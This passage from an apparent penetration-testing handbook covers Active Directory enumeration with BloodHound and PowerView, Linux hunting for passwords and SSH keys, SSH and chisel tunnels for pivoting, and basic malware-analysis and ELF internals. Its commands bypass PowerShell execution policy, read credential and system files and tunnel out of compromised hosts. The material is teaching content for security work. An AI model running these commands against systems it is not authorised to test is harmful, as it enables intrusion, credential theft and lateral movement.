<p>You will first need to create a malicious <code>.scf</code> file where you are going to write a simple (you can scarcely even call it that) script. </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="post-exploitation"><a class="header" href="#post-exploitation">Post Exploitation</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="active-directory-ad"><a class="header" href="#active-directory-ad">Active Directory (AD)</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-9"><a class="header" href="#overview-9">Overview</a></h1>
<p>Bloodhound is a tool used for finding relationships and patterns within data from an Active Directory environment. It is run on the attacker's machine and accessed through a web interface. Bloodhound operates on data and this data comes from a <em>collector</em> which is executed on the target machine.</p>
<h1 id="setup-1"><a class="header" href="#setup-1">Setup</a></h1>
<ol>
<li>Install Bloodhound</li>
</ol>
<pre><code class="language-bash">sudo apt install bloodhound
</code></pre>
<ol start="2">
<li>Configure neo4j - Bloodhound relies on a different tool called neo4j. It is best to change its default credentials.
<ul>
<li>run neo4j</li>
</ul>
<pre><code class="language-bash">sudo neo4j console
</code></pre>
<ul>
<li>open the link it gives you and use the credentials neo4j:neo4j to login</li>
<li>change the password</li>
</ul>
</li>
</ol>
<h1 id="collecting-data-for-bloodhound"><a class="header" href="#collecting-data-for-bloodhound">Collecting Data for Bloodhound</a></h1>
<p>Data is obtained through a collector. There are different ones available. You can get SharpHound from the Bloodhound GitHub repo - https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1.</p>
<p>Start neo4j and bloodhound:</p>
<pre><code class="language-bash">sudo neo4j console
</code></pre>
<pre><code class="language-bash">sudo bloodhound
</code></pre>
<p>Run the collector on the target machine:</p>
<pre><code class="language-powershell">powershell -ep bypass
</code></pre>
<pre><code class="language-powershell">. .\SharpHound.ps1
</code></pre>
<pre><code class="language-powershell">Invoke-BloodHound -CollectionMethod All -Domain &lt;domain&gt; -ZipFileName &lt;output file&gt;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/sharphoundcollector.png" alt="" /></p>
<p>Now, move the files to the attacker machine.</p>
<h1 id="viewing-the-data"><a class="header" href="#viewing-the-data">Viewing the Data</a></h1>
<p>In Bloodhound, on the right you should see a button for <code>Upload Data</code>. Select the previously obtained zip file and wait for Bloodhound to process it.</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/uploaddata.png" alt="" /></p>
<p>In the top left, click on the three dashes and you should see a summary of the data imported:</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/importedsummary.png" alt="" /></p>
<h1 id="finding-relationships-in-the-data"><a class="header" href="#finding-relationships-in-the-data">Finding Relationships in the Data</a></h1>
<p>Through the analysis tab, you can see a bunch of pre-made queries. Their names are usually self-describing. Clicking on any of them will generate a particular graph expressing a specific relationship within the AD environment:</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/bloodhound/domainadmins.png" alt="" /></p>
<p>You are also able to create custom queries.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-10"><a class="header" href="#overview-10">Overview</a></h1>
<p>PowerView is a PowerShell tool for the enumeration of Windows domains. The script can be downloaded from https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1.</p>
<p>Before running, you need to bypass PowerShell's execution policy:</p>
<pre><code class="language-powershell">powershell -ep bypass
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/powershell-ep-bypass.png" alt="" /></p>
<p>Load the script using</p>
<pre><code class="language-powershell">. .\PowerView.ps1
</code></pre>
<p>Normally, you'd be running these commands through some sort of shell, but for the sake of simplicity, I will show them all run locally.</p>
<h1 id="get-domain-information"><a class="header" href="#get-domain-information">Get Domain Information</a></h1>
<pre><code class="language-powershell">Get-NetDomain
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomain.png" alt="" /></p>
<h1 id="get-domain-controller-information"><a class="header" href="#get-domain-controller-information">Get Domain Controller Information</a></h1>
<pre><code class="language-powershell">Get-NetDomainController
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetdomaincontroller.png" alt="" /></p>
<h1 id="retrieve-domain-policy-information"><a class="header" href="#retrieve-domain-policy-information">Retrieve Domain Policy Information</a></h1>
<pre><code class="language-powershell">Get-DomainPolicy
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainpolicy.png" alt="" /></p>
<p>You can also get information about a specific policy with the following syntax:</p>
<pre><code class="language-powershell">(Get-DomainPolicy).&quot;policy name&quot;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getsystemaccessdomainpolicy.png" alt="" /></p>
<h1 id="get-users-information"><a class="header" href="#get-users-information">Get Users Information</a></h1>
<pre><code class="language-powershell">Get-NetUser
</code></pre>
<p>The output of this command is rather messy, but you can pull specific information with the following syntax:</p>
<pre><code class="language-powershell">Get-NetUser | select &lt;property&gt;
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetusersamaccname.png" alt="" /></p>
<p>However, there is an even better way to do that.</p>
<h1 id="get-user-property-information"><a class="header" href="#get-user-property-information">Get User Property Information</a></h1>
<p>Get a specific properties of all the users:</p>
<pre><code class="language-powershell">Get-DomainUser -Properties &lt;property1&gt;,&lt;property2&gt;,...
</code></pre>
<p>It is useful to always have the <code>samaccountname</code> as the first property selected, so that you can easily match properties with specific users.</p>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomainuserproperty.png" alt="" /></p>
<h1 id="get-domain-machines"><a class="header" href="#get-domain-machines">Get Domain Machines</a></h1>
<pre><code class="language-powershell">Get-DomainComputer | select samaccountname, operatingsystem
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaincomputers.png" alt="" /></p>
<h1 id="get-groups"><a class="header" href="#get-groups">Get Groups</a></h1>
<pre><code class="language-powershell">Get-NetGroup | select samaccountname, admincount, description
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getdomaingroups.png" alt="" /></p>
<h1 id="get-group-policy-information"><a class="header" href="#get-group-policy-information">Get Group Policy Information</a></h1>
<pre><code class="language-powershell">Get-NetGPO | select &lt;property1&gt;,&lt;property2&gt;,...
</code></pre>
<p><img src="Post%20Exploitation/Active%20Directory%20(AD)/Resources/Images/getnetgpo.png" alt="" /></p>
<h1 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h1>
<p>https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h3 id="finding-files-containing-passwords"><a class="header" href="#finding-files-containing-passwords">Finding Files Containing Passwords</a></h3>
<p>Find all files in a directory which contain &quot;pass&quot; or &quot;password&quot;, ignoring case:</p>
<pre><code class="language-bash">grep --color=auto -rnw '&lt;dir&gt;' -ie &quot;password\|pass&quot; --color=always 2&gt;/dev/null
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Hunting%20Down%20Sensitive%20Files/find_pass_password.png" alt="" /></p>
<p>Find all files in a directory which contain &quot;pass&quot; or &quot;password&quot; in their name, ignoring case:</p>
<pre><code class="language-bash">find / -name &quot;*pass*&quot; 2&gt;/dev/null
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Hunting%20Down%20Sensitive%20Files/find_pass_password_in_name.png" alt="" /></p>
<h3 id="finding-ssh-keys"><a class="header" href="#finding-ssh-keys">Finding SSH Keys</a></h3>
<pre><code class="language-bash">find / -name id_rsa 2&gt;/dev/null
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Hunting%20Down%20Sensitive%20Files/find_ssh_keys.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="list-network-interfaces-and-network-information"><a class="header" href="#list-network-interfaces-and-network-information">List Network Interfaces and Network Information</a></h3>
<p>Get a list of the network interfaces connected to the machine with their IPs and MACs:</p>
<pre><code class="language-bash">ip a
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Network%20Enumeration/ip_a.png" alt="" /></p>
<p>Get a list of the machines that the victim has been interacting with (print the ARP table):</p>
<pre><code class="language-bash">ip neigh
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Network%20Enumeration/ip_neigh.png" alt="" /></p>
<h3 id="list-open-ports"><a class="header" href="#list-open-ports">List Open Ports</a></h3>
<pre><code class="language-bash">netstat -ano
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/Network%20Enumeration/netstat_ano.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-15"><a class="header" href="#introduction-15">Introduction</a></h1>
<p>System enumeration is a crucial, typically first, step in the enumeration phase of post-exploitation.</p>
<h3 id="enumerating-the-distribution-version"><a class="header" href="#enumerating-the-distribution-version">Enumerating the Distribution Version</a></h3>
<pre><code class="language-bash">cat /etc/issue
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/cat_etc_issue.png" alt="" /></p>
<h3 id="enumerating-linux-kernel-version-information"><a class="header" href="#enumerating-linux-kernel-version-information">Enumerating Linux Kernel Version Information</a></h3>
<pre><code class="language-bash">uname -a
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/uname.png" alt="" /></p>
<pre><code class="language-bash">cat /proc/version
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/cat_proc_version.png" alt="" /></p>
<h3 id="enumerating-cpu-architecture"><a class="header" href="#enumerating-cpu-architecture">Enumerating CPU Architecture</a></h3>
<pre><code class="language-bash">lscpu
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/lscpu.png" alt="" /></p>
<h3 id="enumerating-running-services"><a class="header" href="#enumerating-running-services">Enumerating Running Services</a></h3>
<pre><code class="language-bash">ps aux
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/psaux.png" alt="" /></p>
<h3 id="file-system-enumeration"><a class="header" href="#file-system-enumeration">File System Enumeration</a></h3>
<p>List files owned by a certain <em>user</em> in a directory:</p>
<pre><code class="language-bash">find &lt;dir&gt; -user &lt;user name&gt; 2&gt;/dev/null
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/find_files_user.png" alt="" /></p>
<p>List files owned by a certain <em>user</em> in a directory (without <code>/proc</code>):</p>
<pre><code class="language-bash">find &lt;dir&gt; -user &lt;user name&gt; 2&gt;/dev/null | grep -v &quot;/proc&quot;
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/find_files_user_no_proc.png" alt="" /></p>
<p>List files owned by a certain <em>group</em> in a directory:</p>
<pre><code class="language-bash">find &lt;dir&gt; -group &lt;group name&gt; 2&gt;/dev/null
</code></pre>
<pre><code class="language-bash">find &lt;dir&gt; -group &lt;group name&gt; 2&gt;/dev/null | grep -v &quot;/proc&quot; # ignore /proc
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/System%20Enumeration/find_files_group.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="enumerate-user-name-and-group"><a class="header" href="#enumerate-user-name-and-group">Enumerate User Name and Group</a></h3>
<pre><code class="language-bash">whoami
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/User%20Enumeration/whoami.png" alt="" /></p>
<pre><code class="language-bash">id
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/User%20Enumeration/userenm_id.png" alt="" /></p>
<h3 id="enumerate-commands-runnable-as-root"><a class="header" href="#enumerate-commands-runnable-as-root">Enumerate Commands Runnable as Root</a></h3>
<pre><code class="language-bash">sudo -l
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/User%20Enumeration/sudo_l.png" alt="" /></p>
<h3 id="list-users-on-the-machine"><a class="header" href="#list-users-on-the-machine">List Users on the Machine</a></h3>
<pre><code class="language-bash">cat /etc/passwd
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/User%20Enumeration/cat_etc_passwd.png" alt="" /></p>
<h3 id="get-history-of-commands-the-user-has-run"><a class="header" href="#get-history-of-commands-the-user-has-run">Get History of Commands the User Has Run</a></h3>
<pre><code class="language-bash">history
</code></pre>
<p><img src="Post%20Exploitation/Enumeration/Linux/Resources/Images/User%20Enumeration/history.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-16"><a class="header" href="#introduction-16">Introduction</a></h1>
<p>Pivoting is the act of establishing access to internal resources on a network through a compromised machine. This allows an adversary to exifltrate local data which is usually not accessible from the outside world. Moreover, it permits the use of hacking tools as if they were running from inside the network.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-17"><a class="header" href="#introduction-17">Introduction</a></h1>
<p>SSH Tunneling is a port forwarding technique which uses SSH. It can be used to access internal resources within a network if you have SSH access to a host inside it. Additionally, the tunnel goes through a pre-existing SSH connection and can thus be utilised for bypassing firewalls.</p>
<h1 id="local-port-forwarding"><a class="header" href="#local-port-forwarding">Local Port Forwarding</a></h1>
<p>Local port forwarding is used when you want to create a bridge to a port that hosts an internal service which does not accept connections from outside the network. For this to work, you need to specify two ports - one for the service on the remote machine which you want to access and one on your local machine to create the listener on. Any packets sent to your machine on the local port will be tunneled to the port on the remote machine through the SSH connection. Whilst you will still receive any responses to requests you send through the tunnel, you won't be able to receive arbitrary data that gets sent to the remote port.</p>
<p><img src="Post%20Exploitation/Pivoting/Resources/Images/SSH_Local_Tunnel.png" alt="" /></p>
<p>The syntax is fairly simple:</p>
<pre><code>ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT SSH_SERVER
</code></pre>
<ul>
<li><code>[LOCAL_IP:]</code> - the interface you want to open the listener on. This can be omitted and defaults to <code>localhost</code>.</li>
<li><code>LOCAL_PORT</code> - the port you want to start the listener on. Any traffic sent to this port will be forwarded through the tunnel.</li>
<li><code>DESTINATION</code> - the destination host. This does not need to (and most likely won't) match <code>SSH_SERVER</code>, since you are now trying to access an internal resource.</li>
<li><code>DESTINATION_PORT</code> - the port on the remote machine, that you want to access through the tunnel.</li>
</ul>
<p>You can also add <code>-N -f</code> to the above command, so that <code>ssh</code> runs in the background and only opens the tunnel without giving an interface for typing commands.</p>
<p><img src="Post%20Exploitation/Pivoting/Resources/Images/SSH_Local_Tunnel_Wrong.png" alt="" /></p>
<p>We have now established a tunnel on my Kali machine's port 8080, which will forward any traffic to <code>192.168.129.137:1337</code>, which is my ubuntu server. So let's see if we can access the web page.</p>
<p><img src="Post%20Exploitation/Pivoting/Resources/Images/SSH_Local_Tunnel_Fail.png" alt="" /></p>
<p>Wait, what? We just created the tunnel, but it does not seem to work? Well, remember how the <code>DESTINATION</code> does not need to match the server's IP? This is because the <code>DESTINATION</code> is where the traffic is sent <em>after</em> it gets to the remote machine. In a sense, the remote machine is now the sender and not us. Therefore, in order to access a resource internal to the network, we would need to change <code>DESTINATION</code> to something like <code>localhost</code> or another computer's IP.</p>
<p><img src="Post%20Exploitation/Pivoting/Resources/Images/SSH_Local_Tunnel_Correct.png" alt="" /></p>
<p>Let's again check to see if we have access to the resource hidden behind <code>localhost:1337</code> on the Ubuntu server...</p>
<p><img src="Post%20Exploitation/Pivoting/Resources/Images/SSH_Local_Tunnel_Success.png" alt="" /></p>
<h1 id="remote-port-forwarding"><a class="header" href="#remote-port-forwarding">Remote Port Forwarding</a></h1>
<p>Remote port forwarding is sort of the reverse of local port forwarding. A tunnel is opened and any traffic sent to the tunnel port on the remote machine will be forwarded to the local machine. In the exact same way as above, once the traffic is tunneled, the local machine becomes the sender. Therefore, remote port forwarding is more useful when you want to <em>receive</em> traffic from inside the network, rather than <em>injecting</em> it. You will be able to actively receive any data that is sent to the remote port, but you won't be able to send arbitrary data through the tunnel yourself.</p>
<p>The syntax is also very similar:</p>
<pre><code>ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT SSH_SERVER
</code></pre>
<ul>
<li><code>[REMOTE:]</code> - the remote host to listen on. This resembles the <code>LOCAL_IP</code> when local port forwarding and can be omitted. If left empty, the remote machine will bind on all interfaces</li>
<li><code>REMOTE_PORT</code> - the port on the remote machine that is part of the tunnel.</li>
<li><code>DESTINATION:DESTINATION_PORT</code> - the host and port that the traffic should be sent to once it gets from the remote machine back to the local machine</li>
</ul>
<p>Once again, you can add <code>-N -f</code> to the command, so that <code>ssh</code> runs in the background and only opens the tunnel without giving an interface for typing commands.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-18"><a class="header" href="#introduction-18">Introduction</a></h1>
<p>Chisel is an open-source application for port tunneling. You can get it from https://github.com/jpillora/chisel. Clone the repo and follow the installation instructions.</p>
<p>In order to port tunnel with chisel, you need to have a copy of the binary on both the attacking and the compromised machines.</p>
<h1 id="creating-a-reverse-tunnel"><a class="header" href="#creating-a-reverse-tunnel">Creating a reverse tunnel</a></h1>
<p>Run the following command on the attacking machine:</p>
<pre><code class="language-bash">chisel server -p [Listen Port] --reverse &amp;
</code></pre>
<p>This will setup a chisel server on <code>Listen Port</code>.</p>
<p>On the compromised systenm run:</p>
<pre><code class="language-bash">chisel client [Attacker IP]:[Listen Port] R:[Local Host]:[Local Port]:[Remote Host]:[Remote Port] &amp;
</code></pre>
<p>This will endeavour to connect to a chisel server at the specified <code>Attacker IP</code> and <code>Listen Port</code>. Once it has connected to the remote chisel server, the chisel server will open <code>Remote Port</code> on the <code>Remote Host</code> and tunnel it to the <code>Local Port</code> of <code>Local Host</code>. From now on, any traffic sent to <code>Remote Port</code> on the <code>Remote Host</code> will be forwarded to the <code>Local Port</code> of <code>Local Host</code>. </p>
<p>Chisel also defines some defaults for these values, which means you can omit some of them:</p>
<p><code>Local Host</code> - 0.0.0.0
<code>Remote Host</code> - 0.0.0.0 (server localhost)</p>
<p>As an example, suppose you start a chisel server on your attacking machine (10.10.10.189) on port 1337, and want to gain access to port 3306 on the compromised machine. On the attacking machine you run:</p>
<pre><code class="language-bash">chisel server -p 1337 --reverse &amp;
</code></pre>
<p>On the compromised system you will run:</p>
<pre><code class="language-bash">chisel client 10.10.10.189:1337 R:localhost:3306:localhost:31337 &amp;
</code></pre>
<p>The above basically translates to &quot;Forward any traffic intended for port 31337 localhost on my attacking machine to port 3306 on the localhost of the compromised system&quot;.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-goals-of-malware-analysis"><a class="header" href="#1-goals-of-malware-analysis">1. Goals of Malware Analysis</a></h1>
<p>Malware analysis serves the purpose of providing the information needed to respond to a network intrusion. You will typically need to determine what took place and make sure that you have identified all of the infected machines and files. In analyzing suspected malware, you will seek to determine exactly what it does, how it can be detected on a network, and how to measure and contain its damage.</p>
<ul>
<li><em>host-based signatures</em> - also known as indicators, are used to detect malicious code on victim computers. These often identify files created and/or modified by the malware or specific changes it makes to the registry. Unlike antivirus signatures, malware indicators focus on what the malware does to a system and not on what its characteristics are. Hence why they are better at detected malware which mutates or has been erased from the hard disk.</li>
<li><em>network singnatures</em> - they detect malware by analyzing network traffic.</li>
</ul>
<h1 id="2-malware-analysis-techniques"><a class="header" href="#2-malware-analysis-techniques">2. Malware Analysis Techniques</a></h1>
<ul>
<li>Basic Static Analysis - examining the executable without looking at the actual instructions. It can provide confirmation of whether a file is malicious, information about its functionality, and information for producing network signatures. It is straightforward and often quick, but rather ineffective against sophisticated malware.</li>
<li>Basic Dynamic Analysis - running the malware and examining its behaviour in order to remove it from the system, produce effective signatures, or both. It requires an environment to run the malware without affecting your host system or network.</li>
<li>Advanced Static Analysis - reverse-engineering the malware by loading the executable into a disassembler and examining the program instructions in order to piece together what the program does.</li>
<li>Advanced Dyanamic Analysis - using a debugger to look at the internal state of the malicious code at runtime. </li>
</ul>
<h1 id="3-types-of-malware"><a class="header" href="#3-types-of-malware">3. Types of malware</a></h1>
<ul>
<li>to be finished</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-antivirus-scanning"><a class="header" href="#1-antivirus-scanning">1. Antivirus Scanning</a></h1>
<p>A good first step when analyzing possible malware is to scan it with multiple antivirus programs, which may already have identified the malicious code. However, AV tools are not perfect. The are reliant on a database which contains <em>file signatures</em> - identifiable pieces of known malicious code, and on <em>heuristics</em> - the analysis of behaviour combined with pattern-matching. Rare and modified malware can easily evade AV detection simply because it is not contained its database.</p>
<p>One should run several different antivirus programs against the prospective malicious code, since different AVs use different signatures and heuristics. As such, websites like <a href="https://www.virustotal.com/">VirusTotal</a> can prove very useful in these situations - they allow you to upload files to be scanned by multiple antivirus engines.</p>
<h1 id="2-hashing"><a class="header" href="#2-hashing">2. Hashing</a></h1>
<p>Hashing is a method commonly used for uniquely identifying malware. It can serve as a sort of <em>fingerprint</em> for the malicious code. The Message-Digest Algorithm 5 (MD5) is often used for this purpose, however, the Secure Hash Algorithm 1 (SHA-1) is also popular.</p>
<p>On Windows, one can generate such a hash by using <code>CertUtil</code>:</p>
<p><img src="Malware%20Analysis/Resources/Images/CertUtil-md5sum.png" alt="" /></p>
<p>On Linux, the <code>md5sum</code> command is usually available:</p>
<p><img src="Malware%20Analysis/Resources/Images/Linux-md5sum.png" alt="" /></p>
<p>Once you have a unique hash for some malware, you can use it in the following ways:</p>
<ul>
<li>using the hash as a label</li>
<li>sharing the hash with other analysts to help them identify the malware</li>
<li>look up the hash online to see if it has been previously identified</li>
</ul>
<p><em>It is recommended to use <code>sha256sum</code> when you identify malware because md5sum is vulnerable to collision attacks.</em></p>
<h1 id="3-finding-strings"><a class="header" href="#3-finding-strings">3. Finding Strings</a></h1>
<p>A <em>string</em> is a sequence of characters. A program may contain many different strings - printing a message, connecting to URLs, accessing file locations, etc. Searching through the strings in a program can give hints about its functionality.  If a program creates or modifies a specific file, you will be able to see the string of the file location in the program. The <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings">Strings</a> command can be used to seach a binary for strings that are usually stored in ASCII or Unicode format:</p>
<p><img src="Malware%20Analysis/Resources/Images/Strings.png" alt="" /></p>
<p><em>Note: I haven't used actual malicious code, but instead a little program that I created.</em> </p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-19"><a class="header" href="#introduction-19">Introduction</a></h1>
<p>Hyperlinking is a novel shell code execution technique which allows shell code to invoke procedures from external libraries by abusing the dynamic linker. Typically shell code must rely on syscalls to serve its duty, but this is now no longer the case. The technique has currently only been developed and tested for ELF executables with a PE extension on its way.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-20"><a class="header" href="#introduction-20">Introduction</a></h1>
<p>The <strong>Executable and Linkable Format</strong> (ELF) has established itself as the standard binary format for Unix operating systems and their derivatives. Under LINUX, BSD variants, and other operating systems, ELF is used for executables, shared libraries, object files, core files, and even the kernel boot image. </p>
<h1 id="structure"><a class="header" href="#structure">Structure</a></h1>
<p>An ELF file comprises an <a href="Reverse%20Engineering/Binary%20Formats/ELF/The%20ELF%20Header.html">ELF header</a> followed by data. Inside lie the Program Header Table and the Section Header Table. The former describes memory <a href="Reverse%20Engineering/Binary%20Formats/ELF/Segments.html">segments</a>, while the latter outlies the <a href="Reverse%20Engineering/Binary%20Formats/ELF/Sections.html">sections</a>. </p>
<h1 id="file-types"><a class="header" href="#file-types">File Types</a></h1>
<p>An ELF file may be any of the following:</p>
<ul>
<li><code>ET_NONE</code> - indicates an unknown file type which has not yet been defined.</li>
<li><code>ET_REL</code> - a relocatable file, also sometimes referred to as an object filed. Relocatable object files typically contain position independent code (PIC) that has not yet been linked into an executable and often have the extension <code>.o</code>.</li>
<li><code>ET_EXEC</code> - this is an executable file.</li>
<li><code>ET_DYN</code> - a shared object. This file can be dynamically linked and is also known as a shared library. Such files are loaded and linked into a process' image at runtime by the dynamic linker. Additionally, these <code>DYN</code> files can also serve as standalone executables.</li>
<li><code>ET_CORE</code> - a core-dump file. These are full images of a process during a crash or when a <code>SIGSEGV</code> is returned. These files can be read by debuggers to aid in determining the cause of the crash</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-21"><a class="header" href="#introduction-21">Introduction</a></h1>
<p>Dynamic linking permits the loading of libraries at runtime, which avoids their incorporation into the executable at compile time and, consequently, saves a drastic amount of disk space at the cost of significantly complicating the linking process. The dynamic linker has to go through the instructions and fix any calls to external functions after the required libraries have been mapped into the running executable. Additionally, the default behaviour is the so-called lazy loading - function addresses aren’t even resolved until the first time a procedure is invoked (although this can be overridden when compiling the executable).</p>
<h1 id="how-it-works"><a class="header" href="#how-it-works">How It Works</a></h1>
<p>Dynamically-linked programmes contain a segment of type <code>PT_INTERP</code> which holds the path to the programme's interpreter. Upon execution, the interpreter is invoked and control flow is transferred to it. Subsequently, the interpreter loads the <code>PT_LOAD</code> segments of the programme. Then it uses the dynamic segment (<code>.dynamic</code>) to locate and load all dependencies from disk into memory. Since each dependency may also contain other dynamic dependencies, this process is recursive. Once this is done, <a href="Reverse%20Engineering/Binary%20Formats/ELF/Relocations.html">relocations</a> are performed. Subsequently, the initialisation functions (those in the <code>.preinit_array</code>, <code>.init</code>, and <code>.init_array</code> sections) of the shared libraries are invoked. Finally, the interpreter transfers execution to the programme's entry point as if nothing had happened.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Dynamic_Linking.png" alt="" /></p>
<h2 id="lazy-loading"> Lazy Loading </h2>
The above process, while working, is very unoptimised. Imagine how much time will be wasted loading thousands of symbols at start-up for large programmes. Moreover, a programme could exit prematurely due to incorrect input and what then? All those symbols which got loaded never got used and so resources were again wasted. The solution to this problem, which is also nowadays the default behaviour, is to use the so-called *lazy loading*. Instead of loading every symbol before the programme even starts, symbols are loaded at the time of their first use. More specifically, functions are resolved when they are first invoked. This is all enabled by the *Procedure Linkage Table (PLT)* and the *Global Offset Table (GOT)*.
<h3 id="got"> The Global Offset Table </h3>
The Global Offset Table is a section which gets loaded into the memory image of an ELF file. When lazy loading is enabled, the GOT is writable. Ultimately, the GOT stores absolute addresses but is referenced in a position-independent way. Thus, it serves as a converter from relative to absolute addresses. It is an array of 32- or 64-bit addresses. It is paramount to note that the GOT holds *values* and *not* instructions, so disassembling it will result in garbage.
<h3 id="plt"> The Procedure Linkage Table </h3>
The Procedure Linkage Table resembles the GOT in the sense that it redirects position-independent function calls to absolute locations. This table contains entries of executable code which are 3 instructions long. You can view the PLT of an ELF file using this command:
`objdump -d -j .plt <filename>`
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_PLT.png" alt="" /></p>
<p>There is an entry for every function that is located in a shared library. The first instruction in each entry jumps to the location specified in the corresponding entry of the Global Offset Table. If the function has been called before, this will be the absolute address of its definition in the shared library and so execution flow will be forwarded directly to the function. </p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_PLT_GOT_Called.png" alt="" /></p>
<p>If this is the first time that the procedure is being invoked, the entry in the Global Offset Table will point to the next instruction in the relevant PLT entry. This instruction pushes the <em>relocation argument</em> (<code>relog_arg</code>) for this symbol onto the stack. Finally, the third instruction jumps to the first entry in the PLT - PLT0. This entry is special. In reality, it only contains two instructions (the third is there for alignment purposes). The first instruction in PLT0 pushes the address of the <em>link map</em> onto the stack. The link map is a structure which describes all the dependencies that the ELF file requires and its address is stored in the first entry of the GOT. Next, PLT0 jumps to a function called <code>_dl_runtime_resolve</code>, whose address is stored in the second entry of the GOT.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_PLT_GOT_Uncalled.png" alt="" /></p>
<h3 id="_dl_runtime_resolve"><a class="header" href="#_dl_runtime_resolve"><code>_dl_runtime_resolve</code></a></h3>
<p><code>_dl_runtime_resolve</code> is a special procedure which is what actuates the dynamic linking process. It does not follow standard calling conventions and instead retrieves its arguments directly from the stack. It takes the <code>link_map</code> and the relocation argument, <code>reloc_arg</code>. Under the hood, <code>_dl_runtime_resolve</code> is just a wrapper around several other procedures which will ultimately locate the requested symbol, change its entry in the GOT and then forward execution to it.</p>
<p>Initially, the relocation argument is used in order to locate the appropriate entry in the relocation table of the executable. The <code>r_info</code> member of this entry is then used to find the corresponding element in the dynamic symbol table. From there, <code>st_name</code> is utilised to pinpoint the location of the name of the function in the string table. Subsequently, <code>_dl_runtime_resolve</code> avails itself of this string in order to look it up in the code of the library. Once the address is found, <code>r_offset</code> is used to locate where in the GOT the address should be placed (note that despite its use, <code>r_offset</code> is actually an offset from the beginning of the ELF header). At last, <code>_dl_runtime_resolve_</code> forwards execution to the function initially invoked with any arguments which were provided to it.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_dl_runtime_resolve.png.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-22"><a class="header" href="#introduction-22">Introduction</a></h1>
<p>The word &quot;relocation&quot; describes the process of matching symbol references with symbol definitions. ELF files contain <em>relocation entries</em> which store information about how to modify the contents of the file's sections in order to resolve the symbol references.</p>
